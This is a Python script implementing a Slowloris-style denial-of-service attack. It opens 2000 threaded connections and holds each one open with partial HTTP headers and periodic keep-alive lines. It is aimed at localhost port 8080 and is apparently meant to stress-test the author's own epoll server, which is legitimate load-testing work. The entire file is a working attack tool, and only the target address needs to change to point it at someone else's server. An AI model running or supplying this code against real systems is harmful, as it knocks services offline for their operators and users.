import socket
import threading
import time
import random

# CONFIGURATION
TARGET_IP = "127.0.0.1"
TARGET_PORT = 8080
CONNECTION_COUNT = 2000  # Start with 2000. Windows/WSL might cap at ~4000 ports.

def attack():
    try:
        # 1. Open a raw socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        
        # 2. Send a partial request (Slowloris Attack style)
        # We send the headers but NOT the final \r\n\r\n
        # This forces the server to keep the connection open waiting for more.
        s.send(f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n".encode('utf-8'))
        
        # 3. Hold the connection open!
        # Your Epoll server should track this, but your Thread Pool shouldn't be blocked.
        while True:
            time.sleep(10) # Keep holding it
            s.send(f"X-Keep-Alive: {random.randint(1,1000)}\r\n".encode('utf-8'))
            
    except Exception as e:
        pass # Ignore errors, just a stress test

threads = []
print(f"🚀 Launching {CONNECTION_COUNT} connections against {TARGET_IP}:{TARGET_PORT}...")

for i in range(CONNECTION_COUNT):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()
    threads.append(t)
    if i % 100 == 0:
        print(f"Connected: {i}")

print("✅ Attack running. Check your Dashboard now!")

# Keep main thread alive
while True:
    time.sleep(1)